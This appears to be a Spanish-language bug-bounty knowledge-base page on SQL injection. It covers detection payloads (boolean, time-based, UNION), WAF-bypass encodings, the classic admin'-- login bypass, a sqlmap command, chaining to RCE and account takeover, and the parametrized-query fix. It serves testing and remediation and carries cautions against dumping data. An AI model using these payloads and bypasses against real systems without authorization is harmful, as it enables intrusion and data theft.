---
title: "SQL Injection"
description: "Inyección de SQL arbitrario cuando la app concatena input no confiable dentro de una query."
category: "Web"
date: 2026-07-18
---
# 💉 SQL Injection

Inyección de SQL arbitrario cuando la app concatena input no confiable dentro de una query. Sigue siendo Critical: lectura/escritura de la BD, auth bypass y, a menudo, RCE.

## El concepto núcleo

```
# La app construye:  SELECT * FROM users WHERE id = '<INPUT>'
id=1'          → error de sintaxis  (señal)
id=1 AND 1=1   → 200 normal
id=1 AND 1=2   → distinto/ vacío    (booleano confirmado)
```

## Tipos

| Tipo | Cómo se confirma | Uso |
|------|------------------|-----|
| **In-band (error/union)** | Mensaje de error o `UNION SELECT` refleja datos | Extracción directa |
| **Blind booleano** | `AND 1=1` vs `AND 1=2` cambian la respuesta | Sin output visible |
| **Blind por tiempo** | `SLEEP(5)` / `pg_sleep(5)` retrasa la respuesta | Sin diferencia visible |
| **Out-of-band (OOB)** | DNS/HTTP a tu Collaborator (`xp_dirtree`, `LOAD_FILE`) | Firewall de salida bloquea directo |
| **Second-order** | Payload almacenado que se ejecuta en otra query | Ver **SSRF** second-order |

## Dónde buscar

- Query params, POST body, **headers** (`User-Agent`, `Referer`, `X-Forwarded-For`), cookies.
- Campos de búsqueda, filtros, `ORDER BY` (sort), `LIMIT`, JSON anidado.
- Endpoints de API antiguos (`/api/v1`), export/report, importadores.

## Payloads de detección (mínimos, seguros)

```sql
-- Señal
'   "   `   \   )
1 AND 1=1        -- vs
1 AND 1=2

-- Booleano en string
' OR '1'='1' --
' OR '1'='2' --

-- Tiempo (confirmación sin output)
1'; SELECT pg_sleep(5)--          -- PostgreSQL
1' AND SLEEP(5)--                 -- MySQL
1'; WAITFOR DELAY '0:0:5'--       -- MSSQL

-- Prueba de identidad (no dumpear datos reales)
' UNION SELECT version(),current_user--
```

## Bypass de WAF / filtros

```sql
-- Comentarios y case
SeLeCt / /*!50000SELECT*/ / SEL/**/ECT
-- Espacios
%09 %0a %0c %0d /**/  ()
-- Sin comillas
0x61646d696e   (hex)   CHAR(97,100,109,105,110)
-- Encoding
%27  %2527 (doble URL)  Unicode
-- OR/AND filtrados
|| && ; operadores lógicos alternativos
```

## Auth bypass clásico

```sql
usuario: admin'--
password: cualquiera
-- SELECT * FROM users WHERE user='admin'--' AND pass='...'
```

## Herramientas

| Herramienta | Uso |
|-------------|-----|
| **sqlmap** | `sqlmap -r req.txt --batch --level 3 --risk 2` — confirmar; usado en máquina **CCTV** |
| **Burp Scanner / Intruder** | Fuzzing de payloads + análisis de tiempos |
| **ghauri** | Alternativa moderna a sqlmap |
| **Revisión de código** | Queries concatenadas (auditoría **BlueCMS**) |

> [!warning] Verificación segura (Gate 3 del **Hunting Ejecutable**)
> Confirma con booleano/tiempo o `version()`/`current_user()`. **No** dumpees datos reales de usuarios; extrae solo pruebas de identidad de la BD. Nunca `DROP`/`UPDATE`/`DELETE`.

## Auditoría de código (el fix)

```
# Vulnerable
query = "SELECT * FROM users WHERE id = '" + req.id + "'"

# Correcto — consultas parametrizadas / prepared statements
cursor.execute("SELECT * FROM users WHERE id = %s", (req.id,))
```
Remediación: **prepared statements / ORM parametrizado**, allow-list para nombres de columna en `ORDER BY`, mínimo privilegio del usuario de BD. El WAF es mitigación temporal, no fix.

## Chaining
```
SQLi → volcado de hashes → cracking → ATO
SQLi (stacked/xp_cmdshell/FILE) → RCE
SQLi second-order → almacenado que dispara en query admin
```

## Ejemplos en tus writeups
- **Blue Team y Malware (CAFUC)** — SQLi manual + BlueCMS (auditoría de código)
- Máquinas CCTV, Cobblestone → **Maquinas Boot2Root**

## Relacionado
- **Metodologia Bug Bounty** · **Hunting Ejecutable**
- **NoSQL Injection** — variante NoSQL de inyección
- **SSRF** — second-order SQLi vía SSRF
- **XSS y bypass CSP** — SQLi a XSS (second-order)
- **Claude-BugHunter** (skill `hunt-sqli`)
